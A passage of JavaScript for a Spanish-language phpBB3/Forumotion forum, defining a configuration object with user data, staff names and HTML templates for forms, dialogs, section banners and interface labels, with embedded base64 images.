if ($.getby('.opensource_mobile').length == 0) {
    console.log('%c***************************Codigo Externo**********************************', colors.blue);
    console.log('%c***************************Update:24-07-16*********************************', colors.red);
    var ops = {
        r_LcL: function () {
            console.clear();
            console.log('%c***************************************************************************', colors.red);
            console.log('%c***************************************************************************', colors.blue);
            console.log('%c***************************Update:24-07-16*********************************', colors.red);
            console.log('%c-------------->Open Source phpBB3', colors.title);
            console.log('%c-------------->**** 2 0 1 6 ****', colors.red);
            console.log('%cC %ch %ca %cl %co %c- %cV %ca %cl %cd %ce %cz', colors.gray, colors.red, colors.orange, colors.yellow, colors.green, colors.teal, colors.blue, colors.purple, colors.brown, colors.gray, colors.red, colors.orange);
        },
        Na_user: 'Historial',
        box_info: $.getby('#box_info'),
        nombre_perfil: pu && $.getby('#profile-advanced-right').getElementsByClassName('module')[0].getElementsByTagName('strong')[0].textContent,
        mi_nombre: _userdata.username,
        mi_avatar: _userdata.avatar,
        mi_id: _userdata.user_id,
        soy_staff: _userdata.user_level >= 1,
        soy_adm: _userdata.user_level === 1,
        soy_user: _userdata.user_level === 0,
        estoy_logueado: _userdata.session_logged_in === 1,
        myStaff: ['Chalo', 'RinC', 'Dosh', 'Faxter', 'Fibo', 'Athan', 'Amru G', 'Thor'],
        path_edit: tm && $.getby('.editar')[0].children[0].href,
        id_tema: tm && $.getby('.info_post')[0].getAttribute('name'),
        id_f_post: tm && $.getby('.info_post')[0].getAttribute('id'),
        url_reply: tm && $.getby('.titulo-tema')[0].getAttribute('url'),
        topic_name: tm && $.getby('.nombre-tema')[0].childNodes[0].textContent,
        audio: $.getby('.audioElem')[0],
        e_pt: tm && $.getby('.post')[0].getElementsByClassName('descargar'),
        t_pt: tm && '1' === $.getby('.pagination')[0].childNodes[1].innerHTML,
        o_pt: tm && $.getby('.pagination').length > 1,
        a_pt: /(\<strong\>Recuerdo del primer mensaje\&nbsp\;\:\<\/strong\>)/,
        d_pt: tm && $.getby('.perfil_texto')[1].innerHTML,
        c_pt: tm && $.getby('#Name_post').innerHTML,
        f_pt: tm && $.getby('figure')[0].lastChild.children[0].src,
        u_pt: tm && $.getby('.perfil_texto')[2].innerHTML,
        m_pt: tm && $.getby('.perfil_texto')[3].innerHTML,
        q_pt: 'margin-right: 5px;margin-top:6px',
        g_pt: tm && $.getby('.nav')[2].href.match(/\d+/g)[1] === '14',
        c_sT: document.querySelectorAll('.content strong'),
        p_Fi: tm && $.getby('.post'),
        pag_tb: tm && $.getby('.pagination')[2] && ($.getby('.pagination')[2].outerHTML),
        welcome: $.getby('#fa_welcome'),
        titulo_pagina: document.title,
        l_dom_ready: !1,
        count: 0,
        temp: '',
        post_dom: '.post',
        button_dom: '.post',
        preview_dom: 0,
        editor: 0,
        mode: 0,
        url: 0,
        textarea: 0,
        ajax_load: '<center><i style="color:rgb(0, 0, 0);font-size:32px"class="fa fa-spinner fa-spin"></i></center>',
        cf_content: 0,
        cf_done: 0,
        cf_error: 0,
        cf_name: tm && $.getby('#Name_post').textContent,
        lang: {
            l_pass: '<div class="l_pass" style="display: table; margin: 0 auto; margin-top: 20px;"><div id="cp-main" class="ucp-main"><div style="background-image: linear-gradient(rgb(66, 165, 225),rgb(38, 124, 194));border: none!important;border-radius: 3px;color: rgb(255, 255, 255);padding: 1px 5px;cursor:pointer;width:37px;margin-left:90%;" onclick="ops.close_rsp(this)"> Cerrar </div><h1 class="page-title">Información de Registro</h1><div class="panel"><div class="inner"><fieldset><dl><dt><label>Contraseña actual&nbsp;: *</label></dt><dd><input id="cur_password" type="password" name="cur_password" value="" class="inputbox" ></dd></dl></fieldset></div></div><div class="panel"><div class="inner"><fieldset><dl><dt><label>Nueva contraseña&nbsp;: *</label></dt><dd><input id="new_password" type="password" name="new_password" value="" class="inputbox" maxlength="25"></dd></dl><dl><dt><label>Confirmar contraseña&nbsp;: *</label></dt><dd><input id="password_confirm" type="password" name="password_confirm" value="" class="inputbox" maxlength="25" ><input type="hidden" name="change_password" value="change_password"></dd></dl></fieldset></div></div><fieldset class="submit-buttons"><input onclick="ops.vRpC_(this);return false" class="button1" type="submit" name="submit" value="Registrar"></fieldset></div></div>',
            mergehtml: '<div class="select-theme"><fieldset class="vf_jumpbox merge"><dl>Solo da click en el tema <dd><dt>Nuevo titulo del tema</dt><input class="nuevo_titulo_ajax"></dd></dl><dl><dd><dt> ID del tema (si lo conoces)</dt><input class="nuevo_id_ajax"></dd></dl></br><dt>Buscar en:&nbsp;</dt><select name="selected_id"><option value="-1">Subforos</option><option tag="foro" value="f8">|&nbsp;&nbsp;&nbsp;|--El café</option><option tag="foro" value="f1">|&nbsp;&nbsp;&nbsp;|--Publicidad</option><option tag="foro" value="f14">|&nbsp;&nbsp;&nbsp;|--Soporte</option><option tag="foro" value="f3">|&nbsp;&nbsp;&nbsp;|--Temas resueltos</option><option tag="foro" value="f12">|&nbsp;&nbsp;&nbsp;|--Sección Gráfica</option><option tag="foro" value="f17">|&nbsp;&nbsp;&nbsp;|--Pedidos Resueltos</option><option tag="foro" value="f16">|&nbsp;&nbsp;&nbsp;|--Imagenes</option><option tag="foro" value="f9">|&nbsp;&nbsp;&nbsp;|--Tutoriales</option><option tag="foro" value="f15">|&nbsp;&nbsp;&nbsp;|--Zona Beta</option><option tag="foro" value="f2">|&nbsp;&nbsp;&nbsp;|--Papelera</option><option tag="foro" value="f5">&nbsp;&nbsp;&nbsp;|--CSS</option><option tag="foro" value="f4">&nbsp;&nbsp;&nbsp;|--Javascript</option><option tag="foro" value="f6">&nbsp;&nbsp;&nbsp;|--Templetes/HTML</option><option tag="foro" value="f7">&nbsp;&nbsp;&nbsp;|--Widgets</option><option tag="foro" value="f11">&nbsp;&nbsp;&nbsp;|--Skins</option><option tag="foro" value="f10">&nbsp;&nbsp;&nbsp;|--Foro Errores</option><option tag="foro" value="f13">&nbsp;&nbsp;&nbsp;|--Staff</option></select><input type="hidden" name="tid" value="">&nbsp;</fieldset><br/><b>Selecciona la categoria para buscar el tema, mueve el scroll</b><div class="sugeridos" style="display:none"><h3>Temas sugeridos</h3></div><div class="lostemas" style="display:none"></div></div>',
            movertema: '<div class="mtHwCont"><div id="closeHwCont" onclick="ops.mod_2_c();return false">Mover un tema <i title="Cerrar" class="fa fa-times-circle closeHwm" style="float: right;cursor:pointer"></i></div><div id="contHw" style="min-height:70px"><div class="move-theme" style="font: 11px arial narrow bold !important;"><div class="panel"><fieldset class="fields1"><dl><dt><label>Mover al foro</label></dt><dd><select name="new_forum"><option tag="foro" value="f8">|&nbsp;&nbsp;&nbsp;|--El café</option><option tag="foro" value="f1">|&nbsp;&nbsp;&nbsp;|--Publicidad</option><option tag="foro" value="f14">|&nbsp;&nbsp;&nbsp;|--Soporte</option><option tag="foro" value="f3">|&nbsp;&nbsp;&nbsp;|--Temas resueltos</option><option tag="foro" value="f12">|&nbsp;&nbsp;&nbsp;|--Sección Gráfica</option><option tag="foro" value="f17">|&nbsp;&nbsp;&nbsp;|--Pedidos Resueltos</option><option tag="foro" value="f16">|&nbsp;&nbsp;&nbsp;|--Imagenes</option><option tag="foro" value="f9">|&nbsp;&nbsp;&nbsp;|--Tutoriales</option><option tag="foro" value="f15">|&nbsp;&nbsp;&nbsp;|--Zona Beta</option><option tag="foro" value="f2">|&nbsp;&nbsp;&nbsp;|--Papelera</option><option tag="foro" value="f5">&nbsp;&nbsp;&nbsp;|--CSS</option><option tag="foro" value="f4">&nbsp;&nbsp;&nbsp;|--Javascript</option><option tag="foro" value="f6">&nbsp;&nbsp;&nbsp;|--Templetes/HTML</option><option tag="foro" value="f7">&nbsp;&nbsp;&nbsp;|--Widgets</option><option tag="foro" value="f11">&nbsp;&nbsp;&nbsp;|--Skins</option><option tag="foro" value="f10">&nbsp;&nbsp;&nbsp;|--Foro Errores</option><option tag="foro" value="f13">&nbsp;&nbsp;&nbsp;|--Staff</option></select></dd></dl><p class="center">¿Estás seguro de que quieres mover el/los tema(s) seleccionado(s)? <br><input class="button2 si" type="submit" name="confirm" onclick="ops.mod_2_f()" value="Sí">&nbsp; <input class="button2 no" type="submit" name="cancel" value="No" onclick="ops.mod_2_c();return false"></p></fieldset></div></div></div></div>',
            contact: '<form id="quickContact" class="report"><h1 style="font-size: 14px;text-align: center;font-family: monda;color:rgb(51, 51, 51)"><img style="width: 20px;vertical-align: middle;" src="http://i18.servimg.com/u/f18/19/17/54/05/logoti10.png">Contacta con Open Source</h1><a href="javascript:void(0)" class="modal_close"><i class="fa fa-times-circle"></i></a><fieldset><dl><dt><label for="subject">Tema del mensaje<span class="obligatory">*</span>:</label></dt><dd><input type="text" name="subject" id="subject" maxlength="52" class="inputbox" value="" placeholder="Escribe el título de tu mensaje"></dd></dl></fieldset><fieldset><dl><dt><label for="message">Contenido de Mensaje.<span class="obligatory">*</span>:</label></dt><dd><textarea cols="25" rows="10" name="message" id="message" class="inputbox" placeholder="Redacta aquí lo que nos quieres informar"></textarea></dd></dl></fieldset><fieldset><dl><dt><label for="reg_key">Código de confirmación<span class="obligatory">*</span>:</label></dt><dd class="captcha"><div class="captcha-img"><label for="reg_key" dir="ltr"><img src="/antirobot_pic.forum?a=1" alt="regkey" style="vertical-align: middle;" /></label><input type="hidden" name="username" value=""><input type="hidden" name="time" value=""></div><input class="inputbox tiny" type="text" name="reg_key" id="reg_key" maxlength="5" dir="ltr"></dd></dl></fieldset><fieldset id="addEmail"></fieldset><fieldset class="submit-buttons"><input type="submit" value="Enviar" name="submit"></fieldset></form>',
            img_ava_default: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAACWCAMAAAAL34HQAAAAVFBMVEXv7++np6esrKzt7e3r6+uxsbHk5OTo6OipqanHx8e4uLjh4eHDw8OysrK8vLzR0dHAwMDY2Nja2trNzc20tLTV1dXLy8vJycmurq7c3Ny/v7+wsLB7+hDkAAACrUlEQVR42u3bjXaiMBCG4W8mMQn/ICCo93+f263HdVttS1CS2bN5ruA9OmIYEUmSJEmSJEnyPG26PivzqmoVhLBF3+4cXZxEZNkuy5luGsRn+/ekGxe/So8t0ycVIjOHM91jg5hsyfQQ94hGjTN9qbWIo8jpO+cOMTRMPzggvIx+VioEltEStUZQGS0zBO1qaKlaIZiC6ULUfKmc/iLm8ziSD3dEGDl5qRGEceSnQAgNeSoRQkaecoTQkqdK4V7K+sIgM2vWuBc/iy0CqL2zNALIU1bKuvhPstQgM+ssM2uXslLWu5SVsv6ZLEjM0mXN3ll7g43t6Tdxx+aOVjHYViHz1bJMb8TdwArN0jOtMGBTt7OptM1bTW/kbbgyWqHH1iZaYcQj0S/zR2xNM3mbFR6IPlwltmdn8sQGARwdeXEjgqgk7r+9t5QTwhjJyx5hGCfqrHWlWeJoQVXkIUMopawvnqtO0sH0RlcCf6p+08j7HP6md/IG3ueK6gyCaqWclj/SubRHWTy6OgR3EnUpvVKDoMPDjZ5FZhknMuso62v6ai9hCXivkZk1ycwqZWbVErOUHWiBvUZIY8W0iOsRTuGkPRj4bhJ5P4Za4t0rMEhayf9hWeIKAg35aBCGqmT93vPoVl/Ogb4lPy0CsD2TH+4ttqX2JZM/LvcKm7GHitaqDhabKCamZ/BU4NV0Vzt6lqs7jRcy05le4zwZvEhROnodVxZ4nlrw7vm/l+rZi9RAWxh6+8xIzbSVee2QmYxpS5yZNXPOtDX2nf7iRGGcPMLMicI5maUz5Sgkt2TGbMYUGmcW32tmimFuxAzV4hEbmeLhEY8dKK6DyKrHXQ3F1zzaDcXnivv/JEuQq8/LfxmO+CAjGbLPD5vLsEtZKesiZflIWT5SVlxKZBbj4heB6zL8SVUCbgAAAABJRU5ErkJggg==',
            beta: '<div class="guestMessage" style="background: linear-gradient(to bottom, rgba(233,246,253,1) 0%,rgba(211,238,251,1) 100%);border: 1px solid rgb(48, 138, 205);color: rgb(70, 103, 132);font-size: 13px;line-height: 170%;padding: 10px;width: 974px;margin-left:-1px;"><strong>¡Esta es la sección de mis códigos!</strong><br>En esta sección publicare mis códigos, es decir, aquellos javascript escritos por mi, en las demás secciones estarán aquellos que he probado, arreglado pero los obtuve de diversos foros, no tengo la costumbre de firmar lo mio, ni de dar créditos a los autores, he visto demasiado plagio que mientras yo sepa que yo los hice me es suficiente</br> Pronto estaré anexandolos y explicando su uso.</br> Algunos estan en fase de prueba por eso el nombre de <strong>Zona Beta</strong>, ustedes me ayudaran a que queden perfectos.</div>',
            staff: '<div class="guestMessage" style="background: linear-gradient(to bottom, rgba(233,246,253,1) 0%,rgba(211,238,251,1) 100%);border: 1px solid rgb(48, 138, 205);color: rgb(70, 103, 132);font-size: 13px;line-height: 170%;padding: 10px;width: 974px;margin-left:-1px;"><strong>¡Esta es la sección del staff!</strong><br>Me gustaria que diario se dieran una vuelta por el foro, si no es posible tampoco es problema </div>',
            support: '<div class="guestMessage" style="background: linear-gradient(to bottom, rgb(255, 26, 0) 0%,rgb(255, 26, 0) 100%);border: 1px solid rgb(255, 0, 0);color: rgb(255, 255, 255);font-size: 13px;line-height: 170%;padding: 10px;width: 974px;margin-left:-1px;"><strong>Llena los datos que se te piden al abrir un tema</strong><br>No nos gusta cerrar soportes, pero si abandonas tu tema cuando se te mencione, 7 dias, se enviara a la papelera.</div>',
            evaluaciones: '<div class="guestMessage" style="background: linear-gradient(to bottom, rgba(233,246,253,1) 0%,rgba(211,238,251,1) 100%);border: 1px solid rgb(48, 138, 205);color: rgb(70, 103, 132);font-size: 13px;line-height: 170%;padding: 10px;width: 974px;margin-left:-1px;"><strong>Solicita una evaluación para tu foro</strong><br>debes tener al menos 10 comentarios dentro del foro</div>',
            codigos: '<div class="guestMessage" style="background: linear-gradient(to bottom, rgba(233,246,253,1) 0%,rgba(211,238,251,1) 100%);border: 1px solid rgb(48, 138, 205);color: rgb(70, 103, 132);font-size: 13px;line-height: 170%;padding:10px;width:974px;margin-left: -1px;"><strong>¡Bienvenido a Open Source!</strong><br>En esta sección podrás descargar los códigos, es importante que sepas el sistema para ver lo que esta oculto, Recuerda tener al menos 6 comentarios en el foro de lo contrario, no podras verlos</i><br><br><a href="http://source.openphpbb.com/t386-tutorial-como-veo-los-codigos-de-open-source?amp;topic_name#2125" class="ipsButton_secondary" style="color:rgb(48, 138, 205)!important">Como ver los códigos</a><a href="http://source.openphpbb.com/t385-nuevo-presentaciones" class="ipsButton_secondary" style="color:rgb(48, 138, 205)!important">Presentate a la comunidad</a><a href="/t202-sugerencia-te-gusto-el-foro-dejanos-algun-comentario" class="ipsButton_secondary" style="color:rgb(48, 138, 205)!important">Presenta tu sugerencia</a></div>',
            no_wallpost: '<div class="nomess" style="color:#fff!important;text-shadow:none" ><i class="fa fa-exclamation-circle" aria-hidden="true"></i> ' + _userdata.username + ', no tienes mensajes en tu muro </div>',
            watchBTN: '<i class="fa fa-eye"></i><p style="display: inline-table;"> Seguir el tema</p>',
            unwatchBTN: '<i class="fa fa-eye-slash"></i><p style="display: inline-table;"> Dejar de seguir el tema </p>',
            watchBTNs: '<i class="fa fa-eye"></i><p style="display: inline-table;"> Seguir el subforo</p>',
            unwatchBTNs: '<i class="fa fa-eye-slash"></i><p style="display: inline-table;"> Dejar de seguir el subforo</p>',
            loadlike: '<center><i style="color:rgb(255, 255, 255);font-size:14px;"class="fa fa-spinner fa-spin loadlikeimg"></i></center>',
            cf_p_a: _userdata.username + ' introduce el link de la imagen que será tu portada',
            cf_p_b: _userdata.username + ' introduce el código del color para tus títulos',
            cf_p_c: _userdata.username + ' introduce el código de css para poner sombra',
            red_flag: 'http://www.adictosalgear.org/flag.png',
            wifioff: '<i class="fa fa-wifi offline" style="color:rgb(255, 0, 0);vertical-align:bottom;text-shadow:0 1px rgb(255, 255, 255);"></i>',
            wifion: '<i class="fa fa-wifi online" style="color:rgb(0, 128, 0);vertical-align:bottom;text-shadow:0 1px rgb(255, 255, 255);"></i>',
            noestoy: '<div class="newonlineprofile"><span class="forum-location-not" style="margin-top: -25px;display: inline-block;">No estoy en el foro</span></div>',
            poke_img: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABL1BMVEUAAADm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubn5+bo5+bj5Obl5ubn5ubY3eW6y+SdueONr+KMr+KVtOKfuuOowOO1yOTD0OTQ2OXb3+XR2eWkveN8pOFqmeBml+BomOBsmuBynuB+peGcuOLL1eXO1+WguuN2oeFnl+BnmOC4yuTk5ebc4Obi5ObT2uV0n+FpmeBwneBunOCIrOLW3OWHq+F8peG9zeSrweNlluBrmuCvxOPL1uXF0eS+zeTBz+Ta3uVzn+G0x+SpwePp6OamvuOIrOHV3OWyxuR/puHS2uVtm+DH0+WpwON5o+G1x+R+puGAp+GzxuTd4ebe4eauxOP///+pNLJ1AAAAFnRSTlMAAA9Nlcjm9fw6tfM+3hS9W/ak0uv75D7E6gAAAAFiS0dEZMLauAkAAAAJcEhZcwAAN10AADddARmARl0AAAFXSURBVDjLhZPnWsIwGIVTVtmbJKUoqEgFUhRHEAVxY1UUceCe938PpmUVntK8/9rztk/G+QAQBIfT5faIXmjCK3rcLqdDEADLff4AtCTg9zFDCIbgXEJBAYQj0IZIGERjdkIsCuLQljhITL9AGEpSGmGMkaw/J0ByKpYzC4vZ3NLySn61oEiyDJNANMVwrVgqEwO1sr6Rq24iEaRYIjMgSm9t71CqDqlRSsguTgGW1/cURdlvVJuT+KB1WCmXjzIIMgEdn5ROS2fn7XGsqhfa5dV154atUxcat4SS7h2Z5Cop9thG9H0YQrOm1vLTwj0artxaoA+PHEHrQXvhCdsL/WdkK7x0xj+YI7xaCW9tOoC038d7MAkf+c/+gK9sx3TB7LKMk6Tf9Z8R0uR7mGLXLf92/zStgOQR5oaIRmGwXiDryiVnKzdLgl9abu25g8MdPe7w8sb/H/I4fJ+8yTaNAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE0LTA0LTExVDA4OjEzOjM4KzA4OjAw7hBNOgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxNC0wNC0xMVQwODoxMzozOCswODowMJ9N9YYAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAAAAElFTkSuQmCC',
            banner_blank: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAgEBLAEsAAD/7QaCUGhvdG9zaG9wIDMuMAA4QklNA+0KUmVzb2x1dGlvbgAAAAAQASwAAAABAAEBLAAAAAEAAThCSU0EDRhGWCBHbG9iYWwgTGlnaHRpbmcgQW5nbGUAAAAABAAAAB44QklNBBkSRlggR2xvYmFsIEFsdGl0dWRlAAAAAAQAAAAeOEJJTQPzC1ByaW50IEZsYWdzAAAACQAAAAAAAAAAAQA4QklNBAoOQ29weXJpZ2h0IEZsYWcAAAAAAQAAOEJJTScQFEphcGFuZXNlIFByaW50IEZsYWdzAAAAAAoAAQAAAAAAAAACOEJJTQP1F0NvbG9yIEhhbGZ0b25lIFNldHRpbmdzAAAASAAvZmYAAQBsZmYABgAAAAAAAQAvZmYAAQChmZoABgAAAAAAAQAyAAAAAQBaAAAABgAAAAAAAQA1AAAAAQAtAAAABgAAAAAAAThCSU0D+BdDb2xvciBUcmFuc2ZlciBTZXR0aW5ncwAAAHAAAP////////////////////////////8D6AAAAAD/////////////////////////////A+gAAAAA/////////////////////////////wPoAAAAAP////////////////////////////8D6AAAOEJJTQQIBkd1aWRlcwAAAAAQAAAAAQAAAkAAAAJAAAAAADhCSU0EHg1VUkwgb3ZlcnJpZGVzAAAABAAAAAA4QklNBBoGU2xpY2VzAAAAAGkAAAAGAAAAAAAAAAAAAACWAAAA7QAAAAQAQwBDAEIAMgAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAA7QAAAJYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOEJJTQQREUlDQyBVbnRhZ2dlZCBGbGFnAAAAAQEAOEJJTQQUF0xheWVyIElEIEdlbmVyYXRvciBCYXNlAAAABAAAAAE4QklNBAwVTmV3IFdpbmRvd3MgVGh1bWJuYWlsAAAC5QAAAAEAAABwAAAARwAAAVAAAF0wAAACyQAYAAH/2P/gABBKRklGAAECAQBIAEgAAP/uAA5BZG9iZQBkgAAAAAH/2wCEAAwICAgJCAwJCQwRCwoLERUPDAwPFRgTExUTExgRDAwMDAwMEQwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwBDQsLDQ4NEA4OEBQODg4UFA4ODg4UEQwMDAwMEREMDAwMDAwRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDP/AABEIAEcAcAMBIgACEQEDEQH/3QAEAAf/xAE/AAABBQEBAQEBAQAAAAAAAAADAAECBAUGBwgJCgsBAAEFAQEBAQEBAAAAAAAAAAEAAgMEBQYHCAkKCxAAAQQBAwIEAgUHBggFAwwzAQACEQMEIRIxBUFRYRMicYEyBhSRobFCIyQVUsFiMzRygtFDByWSU/Dh8WNzNRaisoMmRJNUZEXCo3Q2F9JV4mXys4TD03Xj80YnlKSFtJXE1OT0pbXF1eX1VmZ2hpamtsbW5vY3R1dnd4eXp7fH1+f3EQACAgECBAQDBAUGBwcGBTUBAAIRAyExEgRBUWFxIhMFMoGRFKGxQiPBUtHwMyRi4XKCkkNTFWNzNPElBhaisoMHJjXC0kSTVKMXZEVVNnRl4vKzhMPTdePzRpSkhbSVxNTk9KW1xdXl9VZmdoaWprbG1ub2JzdHV2d3h5ent8f/2gAMAwEAAhEDEQA/APVUkkklKSSSSUpJJJJSkkkklKSSSSUpJJJJSkkkklP/0PVUkkklKSSSSUpJJJJSkkkklKSSSSUpJJJJSkkkklP/0fVUkkklKSSSSUpJJJJSkkkklKSSSSUpJJJJSkkkklP/0vVUkkklKSSSSUpJJJJSkkkklKSSSSUpJJJJSkkkklP/0/VUl8qpJKfqpJfKqSSn6qSXyqkkp+qkl8qpJKfqpJfKqSSn6qSXyqkkp+qkl8qpJKf/2QA4QklNBCEaVmVyc2lvbiBjb21wYXRpYmlsaXR5IGluZm8AAAAAVQAAAAEBAAAADwBBAGQAbwBiAGUAIABQAGgAbwB0AG8AcwBoAG8AcAAAABMAQQBkAG8AYgBlACAAUABoAG8AdABvAHMAaABvAHAAIAA2AC4AMAAAAAEAOEJJTQQGDEpQRUcgUXVhbGl0eQAAAAAHAAgBAQABAQD/7gAhQWRvYmUAZEAAAAABAwAQAwIDBgAAAAAAAAAAAAAAAP/bAIQAAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQICAgICAgICAgICAwMDAwMDAwMDAwEBAQEBAQEBAQEBAgIBAgIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMD/8IAEQgAlgDtAwERAAIRAQMRAf/EAF0AAQEAAAAAAAAAAAAAAAAAAAAKAQEAAAAAAAAAAAAAAAAAAAAAEAEAAAAAAAAAAAAAAAAAAACQEQEAAAAAAAAAAAAAAAAAAACQEgEAAAAAAAAAAAAAAAAAAACQ/9oADAMBAQIRAxEAAAC/gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH//2gAIAQIAAQUADr//2gAIAQMAAQUADr//2gAIAQEAAQUADr//2gAIAQICBj8ADr//2gAIAQMCBj8ADr//2gAIAQEBBj8ADr//2Q==',
            l_icon: '<i class="fa fa-thumbs-up" style="font-size:16px;font-size:24px;color:rgba(255, 140, 0, 1)"></i>',
            reply: 'Modo: <p style="color:rgba(128, 0, 128, 1);display:inline">Respuesta</p>',
            pm: 'Modo: <p style="color:rgba(0, 0, 139, 1)">Mensaje Privado</p>',
            edit: 'Modo: <p style="color:rgba(255, 0, 0, 1);display:inline">Edición</p>',
            quote: 'Modo: <p style="color:rgba(0, 128, 0, 1)">Citar</p>',
            preview: '<div class="reply-mode">Modo: <p style="color:rgb(173, 216, 230)">Previsualizar</p></div>',
            loading: "Cargando...",
            flood_message: 'No puedes enviar 2 mensajes consecutivos',
            error_message: 'Ocurrió un error recarga la página',
            no_message: 'No tienes nada en el editor, escribe un mensaje',
            notify_message: _userdata.username + ' deseas mencionar a',
            quote_message: 'en el Post',
            tag_message_title: '[Mensaje automático] fuiste mencionado en: ',
            tag_message_error: 'No se encuentra el nombre',
            tag_message_content: ' fuiste mencionado en ',
            pm_message_title: 'Te enviaron un mensaje en el tema: ',
            pm_message_error: 'No se encuentra el nombre',
            wall_message_title: _userdata.username + ' te escrió desde ',
            preview_button: 'Previsualizar',
            close_button: 'Cerrar',
            send_button: 'Enviar',
            imgur_placeholder1: 'Selecciona los archivos que deseas subir',
            imgur_placeholder2: 'URL externa',
            thumbs: '<i class="fa fa-thumbs-up" aria-hidden="true"></i> ',
            l_vote_singular: 'usuario le gusta el post',
            l_vote_plural: 'usuarios les gusta el post',
            l_iM: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACWklEQVRYR+WXO2iVQRCFzxkfsbO0sVDUyiqdiMZOBAsLSVCMIjZWPkgi2vhItEoiCSLYKZqAUQQRKxFEImKlrQgSsbO1MxjnyMgm3NzX/v+9l5vCrS7/7sz5dmZ2dy6xxoNrrI9WALaa2VlJhwBsA7ARwALJV+5+D8D3MpsqCzBM8haATQ1EFiVdAzBeFKIwgJlNShqucvwbgAPoqfxOcsrdh4pAFAXoJ/m0wuELSRGJj+lbL8nY+ZHlNZL6ATzLQRQBMJJfAWwPZ812Z2ZTki4m0QVJu1KEGnIUAdhH8l3y8EXSbgB/GnhcT/IzgJ0xL6kPwLJtXZMiACMkJ5LDGwBGm4XVzEZTIQbAJQCTzdZnAcxsQtJIAjgJYDaT11MkH6Z0jbv75XYBpiVdSADHAcxlAAZJziSA2+7+D77RKBKB/xNgM4Co4B6SpwEcTiGddvf3mSLcL+l8WvNS0iMAiwDmAfystq2Xgh0kQ2RL7hIpOf9D0l4A3yrtagDMbCXnJQWyy0nWFGU9gFlJJ7LeWlgQx9PdI6Uro12AT3E7A+gtwtNJAEk6CuB5Eh4g+SQH0UmAeUkHVoWS/ABgT9NLp4MpeC3pYBXAWwCroGqOXAcBltJLF7uO0UfyDYB13YpA9AVz7h5vQ/yOxiNqounoZA3EU3sdwFgomtmYpKvdBqhsuY6RfNxVAJI33f1+ikC06Ve6CpATqzdftAZmJA22IpCzIfnA3c80vYoBDMWjkXPWyrykcwDu5gA2mNkdSQPVfzhaEU02v9KxjZZ9KQfQhk5502xPWN5lOYu/hAM9MFOo7kYAAAAASUVORK5CYII=',
            dom_phpbb3: '<span style="color:rgba(0, 93, 144, 1)">php</span><span style="color:rgba(242, 136, 24, 1)">BB3</span>',
            dom_punbb: '<span style="color:rgba(102, 116, 128, 1)">pun</span><span style="color:rgb(34, 95, 135)">BB</span>',
            dom_invision: '<span style="color:rgb(63, 76, 107);">Invision</span>',
            dom_phpbb2: '<span style="color:rgb(11, 143, 212)">php</span><span style="color:rgb(0, 106, 159)">BB2</span>',
            dom_chrome: '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEwAACxMBAJqcGAAAAjZJREFUOI2NUE1I1HEQfW92NRW/opI6SBmp0EHSVZcg0LC2NSP6OIYZhBdjET0IlbEJEUjnCkMw8VhJoaZ9qqFZIQZRewtC6VCdtrbIjf9Mh3bX/aDonWbm996b3zwiDV+8Xo8DdAjZqGQpVCnksgFPSF4vWVh4ncxnvPjU0JDPaPQqgJPppnEoYARuhIuKOiumplYTBh89nrys7OynALx/E6fh8aZwuIWhUFQAIDcnZyOAqv8UA8C+z4WFlwGA/lF/g5jm3rzytR5kHwCY2TTI3pJweJGhUPRfTm4ApwF4ZmrWeRuXVttAvu+r6T52u7yiX8D7m6Gi4MjZbdPnA9sfPRSwLi42wzWhYQ8oO4eactpAdjoiXTFxB4AiQAoE7Oj/sPeSqHUlbzfqfqGhNNb1tfeUzG2Zn38n4ImMvypbuWvyuapF1mbYKvGagg2/dPVC7EUyDARGwgCzlLERK4mOCPju+XYoOJJhYBjWN821IlKwxueym8QMgLLYKMvtcGB9dPFIOLvWoGyFwGAYznfl9pjJXSZ5Ephmy6iv3iAvU+/VWSG7x48/WAoGgwIAwaOvDoIylsKj1hEAmu/4h0icyshN9ZuIvJioKDjkOJG3AilPXKQYdFVPtAsAuLLcZ6A6l5mb5JvDc+Z870wWq+KZFEcCfzgAxg+P/8hzCn0ABqFIpGzE8ESle0XB3pTNxZEDLJv9GcshFf5b/moRa1fDblFX81glL5pZE40zdOmAVE0uJvN/A6NizyHrhCt8AAAAAElFTkSuQmCC" style="width: 12px;">',
